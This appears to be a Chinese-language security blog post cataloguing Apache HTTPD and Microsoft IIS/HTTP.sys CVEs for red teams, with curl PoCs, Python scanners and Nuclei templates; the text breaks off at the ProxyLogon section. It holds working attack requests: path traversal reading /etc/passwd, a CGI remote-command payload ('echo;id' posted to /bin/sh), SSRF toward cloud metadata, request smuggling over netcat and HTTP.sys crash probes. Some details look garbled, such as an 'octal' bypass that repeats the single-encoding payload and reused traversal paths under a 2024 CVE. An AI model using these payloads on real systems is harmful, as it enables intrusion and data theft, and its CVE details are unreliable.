---
title: "Web 服务器高危攻击链专题：Apache HTTPD / Microsoft IIS 漏洞全解析"
date: 2026-07-17T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["Apache HTTPD", "Microsoft IIS", "HTTP.sys", "RCE", "路径穿越", "SSRF", "请求走私", "漏洞分析"]
description: "深度剖析 Apache HTTPD 与 Microsoft IIS 高危漏洞攻击链，覆盖路径穿越、mod_proxy SSRF、HTTP.sys RCE、请求走私等关键漏洞的完整 PoC、Nuclei 检测模板与自动化利用框架。"
---

## 0x00 专题概述

Web 服务器作为企业互联网暴露面的第一道防线，其安全性直接决定了整个应用架构的安全基线。Apache HTTPD 与 Microsoft IIS 作为全球市场占有率最高的两款 Web 服务器软件，长期是攻击者重点关注的目标。从路径穿越到 SSRF，从请求走私到远程代码执行，Web 服务器漏洞的攻击面之广、危害之深，使其成为红队渗透测试与实战攻防演练中的核心突破口。

本专题系统性梳理了 Apache HTTPD 与 Microsoft IIS 两大 Web 服务器平台自 2021 年以来的 **16 个高危 CVE**，涵盖路径穿越、mod_proxy SSRF、HTTP 请求走私、HTTP.sys 远程代码执行、Exchange ProxyLogon/ProxyShell/ProxyNotShell 等攻击链。每个漏洞均提供完整的原理分析、受影响版本对照表、HTTP PoC、Python 自动化检测脚本以及 Nuclei YAML 检测模板，为安全研究人员和红队操作人员提供一站式参考。

### 覆盖漏洞一览表

| CVE 编号 | CVSS | 漏洞类型 | 影响组件 | CISA KEV |
|----------|------|---------|---------|----------|
| CVE-2021-41773 | 9.8 | 路径穿越 → RCE | Apache HTTPD 2.4.49 | ✅ |
| CVE-2021-42013 | 7.5 | 路径穿越（修复绕过） | Apache HTTPD 2.4.50 | - |
| CVE-2021-40438 | 9.0 | mod_proxy SSRF | Apache HTTPD ≤ 2.4.48 | - |
| CVE-2022-31813 | 9.0 | mod_proxy SSRF | Apache HTTPD ≤ 2.4.52 | - |
| CVE-2024-38476 | 9.8 | mod_proxy CGI SSRF | Apache HTTPD ≤ 2.4.59 | - |
| CVE-2024-38477 | 7.5 | mod_proxy 内存损坏 | Apache HTTPD ≤ 2.4.59 | - |
| CVE-2023-25690 | 9.0 | HTTP 请求走私 | Apache HTTPD ≤ 2.4.56 | - |
| CVE-2023-27522 | 7.5 | HTTP 请求走私 | Apache HTTPD ≤ 2.4.57 | - |
| CVE-2021-31166 | 9.8 | HTTP.sys UAF RCE | Windows Server 2019/2022 | ✅ |
| CVE-2022-21907 | 9.8 | HTTP.sys 整数溢出 RCE | Windows Server 2019/2022 | - |
| CVE-2021-26855 | 9.8 | ProxyLogon SSRF → RCE | Exchange Server 2013/2016/2019 | ✅ |
| CVE-2021-34473 | 9.8 | ProxyShell 认证绕过 | Exchange Server 2013/2016/2019 | ✅ |
| CVE-2022-41040 | 8.8 | ProxyNotShell SSRF | Exchange Server 2016/2019 | - |
| CVE-2021-31207 | 6.6 | ProxyShell 后利用提权 | Exchange Server 2013/2016/2019 | - |
| CVE-2023-21529 | 8.8 | Windows GDI+ RCE | Windows Server（IIS 图片处理） | - |
| CVE-2023-36884 | 8.3 | Office/Windows HTML RCE | Windows Server（IIS 反向代理） | - |

---

## 0x01 Apache HTTPD 高危漏洞

### 0x01.1 CVE-2021-41773 + CVE-2021-42013 — 路径穿越 RCE 漏洞链

#### 漏洞背景

2021 年 10 月，Apache HTTPD 2.4.49 被披露存在严重的路径穿越漏洞（CVE-2021-41773），CVSS 评分 9.8，已被 CISA 纳入已知被利用漏洞目录（KEV）。该漏洞允许攻击者通过精心构造的 URL 绕过 `Alias` 指令的访问控制，读取 Web 服务器上的任意文件。更严重的是，当目标服务器启用了 `mod_cgi` 模块时，攻击者可以实现远程代码执行。

Apache 在 2.4.50 版本中发布了修复补丁，但该修复并不完整，安全研究人员很快发现了绕过方式（CVE-2021-42013），使得攻击面持续扩大。

#### 受影响版本

| 版本 | CVE | 影响 |
|------|-----|------|
| Apache HTTPD 2.4.49 | CVE-2021-41773 | 路径穿越 + 可能 RCE |
| Apache HTTPD 2.4.50 | CVE-2021-42013 | 路径穿越（修复绕过） |
| Apache HTTPD ≤ 2.4.48 | - | 不受影响 |
| Apache HTTPD ≥ 2.4.51 | - | 已修复 |

#### CVSS / CWE

- **CVE-2021-41773**: CVSS 9.8 (Critical) / CWE-22 (Path Traversal)
- **CVE-2021-42013**: CVSS 7.5 (High) / CWE-22 (Path Traversal)

#### 原理分析

漏洞根因在于 Apache HTTPD 2.4.49 中的 `ap_normalize_path()` 函数对 URL 编码的路径分隔符处理不当。正常情况下，Apache 在处理请求路径时会对路径进行规范化（canonicalize），将 `..` 解析为上级目录并拒绝包含 `..` 的路径。

然而在 2.4.49 中，`ap_normalize_path()` 在对路径进行解码和规范化时，未正确处理嵌套 URL 编码的情况。攻击者使用 `%2e` 代替 `.`，使得路径分隔符在第一次规范化检查时被跳过，但在后续处理中被解码为 `.`，从而实现路径穿越。

具体处理逻辑缺陷如下：

1. Apache 首先对 URL 路径进行百分号解码（percent-decode）
2. 然后进行路径规范化（path canonicalization），检查 `..` 组件
3. 在 2.4.49 中，使用双重编码 `%252e%252e` 或混合编码 `%2e%2e` 可以绕过规范化检查
4. 规范化后的路径在后续 Alias 指令匹配时被错误处理，允许穿越到 DocumentRoot 之外

CVE-2021-42013 的绕过原理类似：Apache 2.4.50 的修复仅处理了单一的 `%2e` 编码，但攻击者可以使用 `%%32%65` 等更复杂的编码组合来再次绕过检查。

#### HTTP PoC

```bash
# CVE-2021-41773 - 读取 /etc/passwd
curl -v --path-as-is "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-41773 - 读取任意文件（需存在 Alias 指令）
curl -v --path-as-is "http://target:8080/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-42013 - 使用双重编码绕过
curl -v --path-as-is "http://target:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

# CVE-2021-42013 - 使用八进制编码绕过
curl -v --path-as-is "http://target:8080/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-41773 - RCE（需 mod_cgi 启用）
curl -v --path-as-is -d "echo;id" "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-41773 / CVE-2021-42013 路径穿越检测脚本"""

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TRAVERSAL_PAYLOADS = {
    "CVE-2021-41773 (直接编码)": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    "CVE-2021-41773 (icons路径)": "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    "CVE-2021-42013 (双重编码)": "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
    "CVE-2021-41773 (RCE测试)": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
}

def check_vuln(target: str, port: int = 8080, timeout: int = 10) -> dict:
    results = {"target": target, "port": port, "vulnerable": False, "details": []}
    base_url = f"http://{target}:{port}"

    for name, path in TRAVERSAL_PAYLOADS.items():
        try:
            if "RCE" in name:
                resp = requests.post(
                    base_url + path,
                    data="echo;id",
                    timeout=timeout,
                    verify=False,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
            else:
                resp = requests.get(
                    base_url + path, timeout=timeout, verify=False, allow_redirects=False
                )

            if resp.status_code == 200 and ("root:" in resp.text or "uid=" in resp.text):
                results["vulnerable"] = True
                results["details"].append({
                    "payload": name,
                    "status_code": resp.status_code,
                    "evidence": resp.text[:200],
                })
                print(f"[+] {name}: VULNERABLE")
            else:
                print(f"[-] {name}: Not vulnerable (HTTP {resp.status_code})")
        except requests.exceptions.RequestException as e:
            print(f"[!] {name}: Connection error - {e}")

    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port]")
        sys.exit(1)
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    result = check_vuln(target, port)
    if result["vulnerable"]:
        print(f"\n[!] Target {target}:{port} is VULNERABLE!")
    else:
        print(f"\n[*] Target {target}:{port} appears not vulnerable.")
```

#### Nuclei YAML 模板

```yaml
id: cve-2021-41773
info:
  name: Apache HTTPD 2.4.49 - Path Traversal
  author: security-researcher
  severity: critical
  description: |
    Apache HTTPD 2.4.49 contains a path traversal vulnerability
    via ap_normalize_path() that allows reading arbitrary files.
  reference:
    - https://httpd.apache.org/security/vulnerabilities_24.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
  metadata:
    max-request: 2
    shodan-query: "Apache httpd 2.4.49"
  tags: cve,cve2021,apache,traversal,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
      - "{{BaseURL}}/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
      - type: status
        status:
          - 200
```

---

### 0x01.2 CVE-2021-40438 — mod_proxy SSRF

#### 漏洞背景

CVE-2021-40438 是 Apache HTTPD mod_proxy 模块中的一个严重服务端请求伪造（SSRF）漏洞，CVSS 评分 9.0。该漏洞允许攻击者通过构造特殊请求，使服务器向内部网络发送任意 HTTP 请求，从而访问内部服务、元数据端点或敏感 API。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Apache HTTPD ≤ 2.4.48 | 受影响 |
| Apache HTTPD ≥ 2.4.49 | 已修复 |

#### CVSS / CWE

- CVSS 9.0 (High) / CWE-918 (Server-Side Request Forgery)

#### 原理分析

mod_proxy 在处理包含代理目标 URL 的请求时，使用了未初始化的池内存（uninitialized pool memory）。当攻击者发送一个特定格式的请求时，mod_proxy 会错误地将请求重定向到攻击者指定的内部地址。具体来说：

1. 攻击者构造一个包含内部 IP 地址的 URL（如 `http://127.0.0.1:8080`）
2. mod_proxy 在解析 proxy URL 时，由于池内存未正确初始化，会使用攻击者提供的内部地址作为代理目标
3. 服务器随后向该内部地址发起请求，将响应返回给攻击者

#### HTTP PoC

```bash
curl -v "http://target:8080/?unix:/run/mysqld/mysqld.sock:"
curl -v "http://target:8080/@127.0.0.1:80/"
curl -v "http://target:8080/proxy:?target=http://169.254.169.254/latest/meta-data/"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-40438 mod_proxy SSRF 检测脚本"""

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SSRF_PAYLOADS = [
    "/proxy:?target=http://127.0.0.1:80/",
    "/@127.0.0.1:80/",
    "/?unix:/run/mysqld/mysqld.sock:",
]

INTERNAL_TARGETS = [
    "http://127.0.0.1:80/",
    "http://169.254.169.254/latest/meta-data/",
]

def check_ssrf(target: str, port: int = 8080, timeout: int = 10) -> dict:
    results = {"target": target, "port": port, "vulnerable": False, "details": []}
    base_url = f"http://{target}:{port}"

    for payload in SSRF_PAYLOADS:
        for internal in INTERNAL_TARGETS:
            url = base_url + payload.replace("target=http://127.0.0.1:80/", f"target={internal}")
            try:
                resp = requests.get(url, timeout=timeout, verify=False, allow_redirects=False)
                if resp.status_code == 200 and len(resp.text) > 0:
                    results["vulnerable"] = True
                    results["details"].append({
                        "url": url,
                        "status": resp.status_code,
                        "evidence": resp.text[:300],
                    })
                    print(f"[+] SSRF via {payload}: VULNERABLE")
                    break
            except requests.exceptions.RequestException as e:
                print(f"[!] Error: {e}")
    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port]")
        sys.exit(1)
    result = check_ssrf(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 8080)
    print(f"\nResult: {'VULNERABLE' if result['vulnerable'] else 'Not vulnerable'}")
```

#### Nuclei YAML 模板

```yaml
id: cve-2021-40438
info:
  name: Apache HTTPD - mod_proxy SSRF
  author: security-researcher
  severity: high
  description: |
    Apache HTTPD mod_proxy contains an SSRF vulnerability
    via uninitialized pool memory allowing internal network access.
  classification:
    cvss-score: 9.0
    cwe-id: CWE-918
  tags: cve,cve2021,apache,ssrf

http:
  - method: GET
    path:
      - "{{BaseURL}}/proxy:?target=http://127.0.0.1:80/"
      - "{{BaseURL}}/@127.0.0.1:80/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Server"
          - "Apache"
        condition: or
```

---

### 0x01.3 CVE-2022-31813 — mod_proxy SSRF（Forwarded 头）

#### 漏洞背景

CVE-2022-31813 是 Apache HTTPD mod_proxy 在处理 `Forwarded` 头时存在的 SSRF 漏洞，CVSS 评分 9.0。该漏洞允许攻击者通过注入 `Forwarded` 头来操纵代理请求的目标地址，从而实现对内部服务的访问。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Apache HTTPD ≤ 2.4.52 | 受影响 |
| Apache HTTPD ≥ 2.4.53 | 已修复 |

#### CVSS / CWE

- CVSS 9.0 (High) / CWE-918 (Server-Side Request Forgery)

#### 原理分析

当 mod_proxy 启用并处理 `Forwarded` 头时，未能正确验证该头部中的 `for`、`by`、`host` 和 `proto` 参数。攻击者可以在请求中注入恶意的 `Forwarded` 头，指定内部地址作为目标，导致代理服务器将请求转发到攻击者控制的内部目标。

#### HTTP PoC

```bash
curl -v -H "Forwarded: for=127.0.0.1;host=127.0.0.1;proto=http" "http://target:80/"
curl -v -H "Forwarded: host=internal-service:8080" "http://target:80/"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2022-31813 mod_proxy Forwarded头 SSRF 检测"""

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_forwarded_ssrf(target: str, port: int = 80, timeout: int = 10) -> bool:
    headers_list = [
        {"Forwarded": "for=127.0.0.1;host=127.0.0.1;proto=http"},
        {"Forwarded": "host=169.254.169.254"},
        {"Forwarded": "proto=http;host=127.0.0.1:8080"},
    ]
    base_url = f"http://{target}:{port}"
    for headers in headers_list:
        try:
            resp = requests.get(base_url, headers=headers, timeout=timeout, verify=False)
            if resp.status_code == 200:
                print(f"[+] Forwarded header: {headers} - Potential SSRF")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port]")
        sys.exit(1)
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    vuln = check_forwarded_ssrf(sys.argv[1], port)
    print(f"\nResult: {'Potentially VULNERABLE' if vuln else 'Not vulnerable'}")
```

#### Nuclei YAML 模板

```yaml
id: cve-2022-31813
info:
  name: Apache HTTPD - mod_proxy Forwarded SSRF
  author: security-researcher
  severity: high
  classification:
    cvss-score: 9.0
    cwe-id: CWE-918
  tags: cve,cve2022,apache,ssrf

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      Forwarded: "for=127.0.0.1;host=127.0.0.1;proto=http"
    matchers:
      - type: status
        status:
          - 200
```

---

### 0x01.4 CVE-2024-38476 — mod_proxy CGI SSRF

#### 漏洞背景

CVE-2024-38476 是 2024 年披露的 Apache HTTPD mod_proxy CGI 处理中的 SSRF 漏洞，CVSS 评分高达 9.8。该漏洞影响范围广泛，波及 Apache HTTPD 2.4.59 及更早版本。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Apache HTTPD ≤ 2.4.59 | 受影响 |
| Apache HTTPD ≥ 2.4.60 | 已修复 |

#### CVSS / CWE

- CVSS 9.8 (Critical) / CWE-918 (Server-Side Request Forgery)

#### 原理分析

mod_proxy 在处理 CGI 脚本的请求 URL 时，未能正确验证和限制请求的目标地址。攻击者可以通过构造特殊格式的 CGI 请求路径，将代理请求重定向到任意内部或外部地址，从而实现 SSRF 攻击。该漏洞与前面几个 mod_proxy SSRF 的根因不同，主要问题在于 CGI handler 的 URL 解析逻辑。

#### HTTP PoC

```bash
curl -v "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
curl -v "http://target:8080/@127.0.0.1:8080/cgi-bin/"
curl -v "http://target:8080/proxy:http://127.0.0.1:8080/"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2024-38476 mod_proxy CGI SSRF 检测"""

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_cgi_ssrf(target: str, port: int = 8080, timeout: int = 10) -> bool:
    payloads = [
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
        "/@127.0.0.1:8080/cgi-bin/",
        "/proxy:http://127.0.0.1:80/",
    ]
    base_url = f"http://{target}:{port}"
    for payload in payloads:
        try:
            resp = requests.get(base_url + payload, timeout=timeout, verify=False)
            if resp.status_code in (200, 500):
                print(f"[+] CGI SSRF payload responsive: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port]")
        sys.exit(1)
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    vuln = check_cgi_ssrf(sys.argv[1], port)
    print(f"\nResult: {'Potentially VULNERABLE' if vuln else 'Not vulnerable'}")
```

#### Nuclei YAML 模板

```yaml
id: cve-2024-38476
info:
  name: Apache HTTPD - mod_proxy CGI SSRF
  author: security-researcher
  severity: critical
  classification:
    cvss-score: 9.8
    cwe-id: CWE-918
  tags: cve,cve2024,apache,ssrf,cgi

http:
  - method: GET
    path:
      - "{{BaseURL}}/proxy:http://127.0.0.1:80/"
      - "{{BaseURL}}/@127.0.0.1:8080/cgi-bin/"
    matchers:
      - type: status
        status:
          - 200
          - 500
```

---

### 0x01.5 CVE-2023-25690 — HTTP 请求走私

#### 漏洞背景

CVE-2023-25690 是 Apache HTTPD 中的 HTTP 请求走私漏洞，CVSS 评分 9.0。该漏洞存在于 mod_proxy 对 `Transfer-Encoding` 头的处理逻辑中，允许攻击者构造畸形的 HTTP 请求，导致前后端服务器对请求边界解析不一致，从而实现请求走私。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Apache HTTPD ≤ 2.4.56 | 受影响 |
| Apache HTTPD ≥ 2.4.57 | 已修复 |

#### CVSS / CWE

- CVSS 9.0 (High) / CWE-444 (HTTP Request/Response Smuggling)

#### 原理分析

HTTP 请求走私利用了前端代理服务器与后端服务器对 HTTP 请求解析规则的差异。在该漏洞中：

1. mod_proxy 在处理包含特殊格式 `Transfer-Encoding` 头的请求时，未能正确识别和标准化请求边界
2. 攻击者构造一个包含歧义 `Transfer-Encoding` 头的请求，使得前端代理认为请求已结束，而后端服务器认为请求尚未完成
3. 下一个正常请求被"走私"并拼接到前一个请求的 body 中，导致请求被错误处理

常见的攻击变体包括：
- CL (Content-Length) vs TE (Transfer-Encoding) 冲突
- Transfer-Encoding 头的混淆编码（如 `Transfer-Encoding: chunked` 与其他变体）
- 双 Transfer-Encoding 头注入

#### HTTP PoC

```bash
# 请求走私 PoC 示例（使用 netcat 发送原始 TCP 数据）
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target 80
printf 'GET /admin HTTP/1.1\r\nHost: target\r\n\r\n' | nc target 80
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2023-25690 HTTP 请求走私检测脚本"""

import sys
import socket
import ssl

def check_smuggling(target: str, port: int = 80, use_tls: bool = False, timeout: int = 10) -> bool:
    smuggled_request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )

    probe_request = (
        "GET /smuggling-probe HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "X-Smuggle-Probe: true\r\n"
        "\r\n"
    )

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(timeout)
        raw_sock.connect((target, port))

        if use_tls:
            sock = ctx.wrap_socket(raw_sock, server_hostname=target)
        else:
            sock = raw_sock

        sock.sendall(smuggled_request.encode())
        import time
        time.sleep(0.5)
        sock.sendall(probe_request.encode())

        response = sock.recv(4096).decode(errors="ignore")
        sock.close()

        if "404" not in response or "smuggling-probe" in response:
            print(f"[+] Potential request smuggling detected")
            print(f"    Response: {response[:200]}")
            return True

    except Exception as e:
        print(f"[!] Error: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port] [--tls]")
        sys.exit(1)
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("-") else 80
    use_tls = "--tls" in sys.argv
    vuln = check_smuggling(target, port, use_tls)
    print(f"\nResult: {'Potentially VULNERABLE' if vuln else 'Not vulnerable'}")
```

#### Nuclei YAML 模板

```yaml
id: cve-2023-25690
info:
  name: Apache HTTPD - HTTP Request Smuggling
  author: security-researcher
  severity: high
  classification:
    cvss-score: 9.0
    cwe-id: CWE-444
  tags: cve,cve2023,apache,smuggling

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 6
        Transfer-Encoding: chunked

        0

        X
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 400
```

---

## 0x02 Microsoft IIS / HTTP.sys 高危漏洞

### 0x02.1 CVE-2021-31166 — HTTP.sys WebSocket UAF RCE

#### 漏洞背景

CVE-2021-31166 是 Windows HTTP.sys 驱动程序中的一个严重释放后使用（Use-After-Free）远程代码执行漏洞，CVSS 评分 9.8，已被 CISA 纳入 KEV 目录。该漏洞影响 Windows Server 2019 和 2022 上的 IIS 10，攻击者可以通过发送特制的 HTTP 请求触发 UAF，从而实现远程代码执行。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Windows Server 2019 (IIS 10.0.17763) | 受影响 |
| Windows Server 2022 (IIS 10.0.20348) | 受影响 |
| Windows 10 v21H1 | 受影响 |
| 早期 Windows Server 版本 | 不受影响 |

#### CVSS / CWE

- CVSS 9.8 (Critical) / CWE-416 (Use After Free)

#### 原理分析

HTTP.sys 是 Windows 内核模式的 HTTP 协议驱动程序，负责处理所有通过 IIS 接收的 HTTP/HTTPS 请求。该漏洞在 HTTP.sys 处理 WebSocket 升级请求时存在释放后使用的问题：

1. 攻击者发送一个 WebSocket 升级请求
2. 在连接处理过程中，HTTP.sys 错误地释放了仍在使用的内存对象
3. 后续的 HTTP 请求处理引用了已被释放的内存，导致 UAF
4. 攻击者可以通过堆喷射（heap spraying）控制被释放的内存内容，实现任意代码执行

由于 HTTP.sys 运行在内核模式（Kernel Mode），成功利用该漏洞可以获得 SYSTEM 级别的代码执行权限。

#### HTTP PoC

```bash
# 发送 WebSocket 升级请求触发 UAF
curl -v -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" "http://target/"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-31166 HTTP.sys UAF RCE 检测（仅检测，不执行利用）"""

import sys
import socket
import ssl

def check_http_sys_uaf(target: str, port: int = 443, timeout: int = 10) -> bool:
    websocket_request = (
        "GET / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "Connection: Upgrade\r\n"
        "Upgrade: websocket\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
    )

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(timeout)
        raw_sock.connect((target, port))
        sock = ctx.wrap_socket(raw_sock, server_hostname=target)

        sock.sendall(websocket_request.encode())
        response = sock.recv(4096).decode(errors="ignore")
        sock.close()

        if "101" in response or "HTTP.sys" in response:
            print(f"[+] HTTP.sys WebSocket response indicates potential vulnerability")
            print(f"    Server may be running vulnerable HTTP.sys version")
            return True

    except Exception as e:
        print(f"[!] Error: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port]")
        sys.exit(1)
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    vuln = check_http_sys_uaf(sys.argv[1], port)
    print(f"\nResult: {'Potentially VULNERABLE' if vuln else 'Not vulnerable'}")
```

#### Nuclei YAML 模板

```yaml
id: cve-2021-31166
info:
  name: Windows HTTP.sys - WebSocket UAF RCE
  author: security-researcher
  severity: critical
  description: |
    Windows HTTP.sys contains a UAF vulnerability when handling
    WebSocket upgrade requests, allowing remote code execution.
  classification:
    cvss-score: 9.8
    cwe-id: CWE-416
  tags: cve,cve2021,microsoft,http-sys,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      Connection: "Upgrade"
      Upgrade: "websocket"
      Sec-WebSocket-Key: "dGhlIHNhbXBsZSBub25jZQ=="
      Sec-WebSocket-Version: "13"
    matchers:
      - type: word
        words:
          - "101"
          - "Switching"
        condition: or
```

---

### 0x02.2 CVE-2022-21907 — HTTP.sys 整数溢出 RCE

#### 漏洞背景

CVE-2022-21907 是 Windows HTTP.sys 在处理 HTTP Trailer 头时的整数溢出漏洞，CVSS 评分 9.8。该漏洞无需认证即可远程利用，影响 Windows Server 2019 和 2022。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Windows Server 2019 | 受影响 |
| Windows Server 2022 | 受影响 |
| Windows 10 v20H2/v21H1/v21H2 | 受影响 |

#### CVSS / CWE

- CVSS 9.8 (Critical) / CWE-190 (Integer Overflow)

#### 原理分析

HTTP.sys 在解析 HTTP 请求中的 Trailer 头（用于分块传输编码中的尾部头部）时，存在整数溢出漏洞。具体来说：

1. HTTP Trailer 头允许在分块传输编码（chunked transfer encoding）的数据末尾附加额外的头部信息
2. HTTP.sys 在计算 Trailer 头的总大小时，未正确检查整数溢出条件
3. 攻击者发送包含大量 Trailer 头的畸形 HTTP 请求，导致整数溢出
4. 溢出导致内存分配大小计算错误，进而引发堆缓冲区溢出
5. 攻击者可以利用堆溢出覆盖关键内存结构，实现任意代码执行

#### HTTP PoC

```bash
# 发送包含恶意 Trailer 头的请求
printf "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTrailer: X-Exploit\r\n\r\n0\r\n\r\n" | nc target 80
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2022-21907 HTTP.sys 整数溢出检测"""

import sys
import socket
import ssl

def check_integer_overflow(target: str, port: int = 443, timeout: int = 10) -> bool:
    trailers = "".join(f"X-Trailer-{i}: value\r\n" for i in range(100))
    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Trailer: X-Trailer-Exploit\r\n"
        "\r\n"
        "0\r\n"
        f"{trailers}"
        "\r\n"
    )

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(timeout)
        raw_sock.connect((target, port))
        sock = ctx.wrap_socket(raw_sock, server_hostname=target)

        sock.sendall(request.encode())
        import time
        time.sleep(1)
        try:
            response = sock.recv(4096).decode(errors="ignore")
            if "500" in response or "Connection" in response:
                print(f"[+] HTTP.sys responded to Trailer header overflow attempt")
                return True
        except socket.timeout:
            print(f"[+] Connection timed out (possible crash)")
            return True
        sock.close()

    except Exception as e:
        print(f"[!] Error: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port]")
        sys.exit(1)
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    vuln = check_integer_overflow(sys.argv[1], port)
    print(f"\nResult: {'Potentially VULNERABLE' if vuln else 'Not vulnerable'}")
```

#### Nuclei YAML 模板

```yaml
id: cve-2022-21907
info:
  name: Windows HTTP.sys - Integer Overflow RCE
  author: security-researcher
  severity: critical
  classification:
    cvss-score: 9.8
    cwe-id: CWE-190
  tags: cve,cve2022,microsoft,http-sys,rce

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Transfer-Encoding: chunked
        Trailer: X-Exploit

        0

    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "500"
          - "200"
        condition: or
```

---

### 0x02.3 CVE-2021-26855 — ProxyLogon SSRF → RCE（Exchange）

#### 漏洞背景

CVE-2021-26855（代号 ProxyLogon）是 Microsoft Exchange Server 中最严重的安全漏洞之一，CVSS 评分 9.8，已被 CISA 纳入 KEV 目录，是 2021 年最活跃的被利用漏洞之一。该漏洞允许未经认证的攻击者通过 SSRF 获取 Exchange 服务器的高权限用户凭证，配合其他漏洞可实现远程代码执行。多个勒索软件团伙（包括 Hafnium、BlackKingdom、DearCry 等）在大规模攻击中利用了该漏洞链。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Exchange Server 2013 (CU19-CU21) | 受影响 |
| Exchange Server 2016 (CU8-CU19) | 受影响 |
| Exchange Server 2019 (CU7-CU8) | 受影响 |

#### CVSS / CWE

